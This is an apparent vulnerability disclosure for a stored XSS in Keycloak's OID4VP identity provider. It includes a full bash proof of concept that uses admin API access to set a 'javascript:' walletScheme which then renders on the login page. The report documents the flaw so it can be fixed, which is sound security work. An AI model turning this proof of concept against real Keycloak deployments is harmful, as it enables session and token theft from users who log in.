## Finding #3 — OID4VP WalletScheme Stored XSS

**Severity:** High (CVSS 8.1)
**Type:** Stored Cross-Site Scripting (XSS)
**Feature:** OID4VP Identity Provider (Experimental)
**Affected Code:** `OID4VPIdentityProvider.java:254-259`

---

### Description

An admin can set the `walletScheme` config of an OID4VP Identity Provider to a `javascript:` URI. This value is rendered unescaped as an `href` on the login page. Any user who visits the login page and clicks the wallet button executes arbitrary JavaScript in the context of the Keycloak domain — stealing sessions, tokens, or credentials.

**Attack scenario:** A compromised or malicious admin (or an attacker who gains admin API access) injects the XSS payload. Every user who logs in through that realm is exposed.

---

### Full Reproduction Steps

```bash
# === SETUP ===
KC=http://localhost:8084

# Keycloak must be running with oid4vc-vp feature:
# JAVA_HOME=/usr/lib/jvm/java-17-openjdk-amd64 KC_BOOTSTRAP_ADMIN_USERNAME=admin KC_BOOTSTRAP_ADMIN_PASSWORD=admin bin/kc.sh start-dev --http-port=8084 --features=oid4vc-vci,oid4vc-vp,preview

tok() {
  curl -s $KC/realms/master/protocol/openid-connect/token \
    -d client_id=admin-cli -d username=admin -d password=admin \
    -d grant_type=password \
    | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])'
}

# === STEP 1: Clean up any previous PoC ===
T=$(tok)
curl -s -X DELETE "$KC/admin/realms/master/identity-provider/instances/oid4vp-poc" \
  -H "Authorization: Bearer $T"

# === STEP 2: Create malicious OID4VP Identity Provider ===
T=$(tok)
curl -s -X POST $KC/admin/realms/master/identity-provider/instances \
  -H "Authorization: Bearer $T" \
  -H 'Content-Type: application/json' \
  -d '{
    "alias":"oid4vp-poc",
    "providerId":"oid4vp",
    "enabled":true,
    "config":{
      "walletScheme":"javascript:alert(document.domain)//",
      "trustedIssuerJwks":"https://example.com"
    }
  }'

# === STEP 3: Generate the malicious login URL ===
CHALLENGE=$(echo -n "testverifier123456789012345678901234567890123" \
  | openssl dgst -sha256 -binary | openssl base64 -A \
  | tr '+/' '-_' | tr -d '=')

echo ""
echo "=== Open this URL in your browser ==="
echo "$KC/realms/master/protocol/openid-connect/auth?client_id=account-console&response_type=code&scope=openid&redirect_uri=http%3A%2F%2Flocalhost%3A8084%2Frealms%2Fmaster%2Faccount&kc_idp_hint=oid4vp-poc&code_challenge=$CHALLENGE&code_challenge_method=S256&nonce=test123&state=test456"
echo ""

# === STEP 4: Verify via curl ===
echo "=== Verifying XSS payload in page source ==="
curl -s -L -c /tmp/kc-cookies -b /tmp/kc-cookies \
  "$KC/realms/master/protocol/openid-connect/auth?client_id=account-console&response_type=code&scope=openid&redirect_uri=http%3A%2F%2Flocalhost%3A8084%2Frealms%2Fmaster%2Faccount&kc_idp_hint=oid4vp-poc&code_challenge=$CHALLENGE&code_challenge_method=S256&nonce=test123&state=test456" \
  | grep -o 'javascript:[^"]*'

# === STEP 5: Cleanup ===
T=$(tok)
curl -s -X DELETE "$KC/admin/realms/master/identity-provider/instances/oid4vp-poc" \
  -H "Authorization: Bearer $T"
echo "Cleanup done."
```

### Expected Result

- **Step 2:** IdP created successfully (empty response = 201)
- **Step 3:** URL printed — open in browser, you see "Sign in with your wallet" page with QR code and a wallet button
- **Step 4:** curl output shows `javascript:alert(document.domain)//` in the page source
- **Browser:** Click the wallet button → `alert` pops up showing `localhost:8084` — confirming JavaScript execution in Keycloak's origin

### Root Cause

`OID4VPIdentityProvider.java` line 254-259 passes the `walletScheme` config directly into the redirect URI without validating the scheme. No allowlist restricts it to `openid4vp://` or `https://` — any scheme including `javascript:` is accepted and rendered as a clickable link.

### Impact

- Session hijacking (steal `KEYCLOAK_SESSION` cookie)
- Token theft (steal access/refresh tokens)
- Credential harvesting (inject fake login form)
- Account takeover of any user visiting the login page
